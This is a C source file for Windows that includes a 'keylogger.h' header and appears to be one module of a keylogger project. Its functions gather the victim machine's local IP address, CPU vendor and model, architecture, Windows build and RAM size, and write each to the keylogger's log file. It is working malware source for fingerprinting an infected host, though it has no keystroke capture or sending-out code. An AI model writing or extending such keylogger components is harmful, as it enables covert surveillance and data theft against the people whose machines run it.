#include "keylogger.h"

void	get_ip_address(void)
{
	WSADATA wsaData;
	char hostname[256];

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return;

	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
		WSACleanup();
		return;
	}

	struct addrinfo hints, *res = NULL;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(hostname, NULL, &hints, &res) != 0)
	{
		WSACleanup();
		return;
	}

	char ipstr[INET_ADDRSTRLEN] = {0};

	struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;

	if (InetNtop(AF_INET, &(ipv4->sin_addr), ipstr, sizeof(ipstr)) != NULL)
	{
		char message[256];
		snprintf(message, sizeof(message), "Adresse IP : %s\n", ipstr);
		write_to_file(message);
	}

	freeaddrinfo(res);
	WSACleanup();
}

const char* get_arch_name(WORD arch)
{
	switch (arch)
	{
		case PROCESSOR_ARCHITECTURE_INTEL:			return "Intel (x86)";
		case PROCESSOR_ARCHITECTURE_MIPS:			return "MIPS";
		case PROCESSOR_ARCHITECTURE_ALPHA:			return "Alpha";
		case PROCESSOR_ARCHITECTURE_PPC:			return "PowerPC";
		case PROCESSOR_ARCHITECTURE_SHX:			return "SHX";
		case PROCESSOR_ARCHITECTURE_ARM:			return "ARM";
		case PROCESSOR_ARCHITECTURE_IA64:			return "Intel Itanium";
		case PROCESSOR_ARCHITECTURE_ALPHA64:		return "Alpha64";
		case PROCESSOR_ARCHITECTURE_MSIL:			return "MSIL";
		case PROCESSOR_ARCHITECTURE_AMD64:			return "AMD64 (x64)";
		case PROCESSOR_ARCHITECTURE_IA32_ON_WIN64:	return "IA32 on Win64";
		case PROCESSOR_ARCHITECTURE_NEUTRAL:		return "Neutral";
		case PROCESSOR_ARCHITECTURE_ARM64:			return "ARM64";
		case PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64:	return "ARM32 on Win64";
		case PROCESSOR_ARCHITECTURE_IA32_ON_ARM64:	return "IA32 on ARM64";
		case PROCESSOR_ARCHITECTURE_UNKNOWN:		return "Unknown";
		default:									return "Unknown (undefined)";
	}
}

void get_cpu_info(void)
{
	int cpuInfoData[4] = {0};
	char vendor[13] = {0};

	__cpuid(cpuInfoData, 0);
	*((int*)vendor) = cpuInfoData[1];
	*((int*)(vendor + 4)) = cpuInfoData[3];
	*((int*)(vendor + 8)) = cpuInfoData[2];

	char modelInfo[256] = {0};

	int modelData[4] = {0};
	char brand[49] = {0};

	__cpuid(modelData, 0x80000002);
	memcpy(brand, modelData, 16);

	__cpuid(modelData, 0x80000003);
	memcpy(brand + 16, modelData, 16);

	__cpuid(modelData, 0x80000004);
	memcpy(brand + 32, modelData, 16);
	brand[48] = '\0';

	snprintf(modelInfo, sizeof(modelInfo), "CPU Vendor: %s\nCPU Model: %s\n", vendor, brand);
	write_to_file(modelInfo);

	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	char cpuInfo[256];
	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNombre de processeurs: %lu\n",
				 get_arch_name(sysInfo.wProcessorArchitecture),
				(unsigned long)sysInfo.dwNumberOfProcessors);
	write_to_file(cpuInfo);
}

void get_windows_info(void)
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod)
	{
		void* pFn = (void*)GetProcAddress(hMod, "RtlGetVersion");
		if (pFn)
		{
			RtlGetVersionPtr fn = (RtlGetVersionPtr)pFn;
			RTL_OSVERSIONINFOW rovi;
			ZeroMemory(&rovi, sizeof(rovi));
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fn(&rovi) == 0)
			{
				char versionInfo[256];
				snprintf(versionInfo, sizeof(versionInfo),
						 "Windows version: %ld.%ld (build %ld)\n",
						 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
				write_to_file(versionInfo);
				return;
			}
		}
	}
	write_to_file("Impossible de récupérer la version de Windows\n");
}

void get_ram_info(void)
{
	MEMORYSTATUSEX status;
	status.dwLength = sizeof(status);
	GlobalMemoryStatusEx(&status);
	char ramInfo[256];
	snprintf(ramInfo, sizeof(ramInfo), "RAM: %llu MB\n", status.ullTotalPhys / (1024 * 1024));
	write_to_file(ramInfo);
}
